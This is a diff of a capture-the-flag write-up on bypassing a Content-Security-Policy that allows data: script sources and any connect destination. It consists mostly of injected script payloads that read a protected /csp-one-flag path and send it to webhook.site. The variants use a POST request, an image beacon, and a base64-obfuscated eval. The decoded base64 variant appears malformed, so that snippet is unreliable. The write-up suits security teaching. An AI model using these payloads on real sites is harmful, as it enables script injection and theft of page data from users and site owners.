@@ -16,7 +16,6 @@ We are presented with a web application that loads a page with the following CSP
 Content-Security-Policy: connect-src '*'; script-src 'self' data:
 ```
 
-
 A hidden flag is located at the path `/csp-one-flag`, but direct access is prevented unless you can execute JavaScript in the context of the page.
 
 ---
@@ -31,24 +30,88 @@ Here's what the CSP means:
 - **`connect-src '*':`**
   - Permits `fetch`, `XMLHttpRequest`, or WebSocket connections to any external domain — a major opening for data exfiltration.
 
+### Vulnerability Assessment
+
+The combination of these two directives creates a security vulnerability:
+
+1. **`data:` scheme allowed**: This permits execution of JavaScript through data URLs
+2. **Wildcard `connect-src`**: This allows exfiltration of data to any external domain
+3. **Missing `object-src` restrictions**: Could allow additional attack vectors
+
 ---
 
 ## Objective
 
 Bypass the CSP to:
 
-1. Retrieve the contents of `/csp-one-flag` using JavaScript.
-2. Exfiltrate that content to an external service, such as [webhook.site](https://webhook.site), where we can view it.
+1. Retrieve the contents of `/csp-one-flag` using JavaScript
+2. Exfiltrate that content to an external service for analysis
 
 ---
 
-## Exploit Strategy
+## Technical Analysis
+
+### Attack Vector
 
 Since inline scripts are blocked but `script-src` allows `data:` URLs, we can inject JavaScript using a `data:`-based script tag.
 
-## Payload:
+### Proof of Concept Payload
 
 ```html
-<script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/',{method:'POST',body:data}))"></script>
+<script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/YOUR-WEBHOOK-ID',{method:'POST',body:data}))"></script>
 ```
 
+### Payload Breakdown
+
+1. **`data:text/javascript,`**: Uses the data URL scheme to embed JavaScript directly
+2. **`fetch('/csp-one-flag')`**: Retrieves the flag from the protected endpoint
+3. **`.then(r=>r.text())`**: Converts the response to text
+4. **`.then(data=>fetch(...))`**: Exfiltrates the data via POST request
+
+---
+
+## Step-by-Step Exploitation
+
+### 1. Set Up Data Exfiltration Endpoint
+- Visit [webhook.site](https://webhook.site) or similar service
+- Note your unique webhook URL for receiving exfiltrated data
+
+### 2. Craft the Payload
+```javascript
+// Minified payload for data: URL
+fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/YOUR-ID',{method:'POST',body:data}))
+```
+
+### 3. Inject via Script Tag
+```html
+<script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/YOUR-ID',{method:'POST',body:data}))"></script>
+```
+
+### 4. Monitor Webhook
+Check your webhook endpoint for the exfiltrated flag data.
+
+---
+
+## Alternative Techniques
+
+### Using `eval()` with Data URLs
+```html
+<script src="data:text/javascript,eval(atob('ZmV0Y2goJy9jc3Atb25lLWZsYWcnKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKGRhdGE9PmZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS9ZT1VSLVVSTC17bWV0aG9kOidQT1NUJyxib2R5OmRhdGF9KSk='))"></script>
+```
+
+### Using Image Tags for Exfiltration
+```html
+<script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>{new Image().src='https://webhook.site/YOUR-ID?flag='+encodeURIComponent(data)})"></script>
+```
+
+---
+
+## Tools and Resources
+
+### Useful Tools
+- **CSP Evaluator**: [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
+- **Browser DevTools**: For testing and debugging
+
+### Further Reading
+- [MDN CSP Documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
